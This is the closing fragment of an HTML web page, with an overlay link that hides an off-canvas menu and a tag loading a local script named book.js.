  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
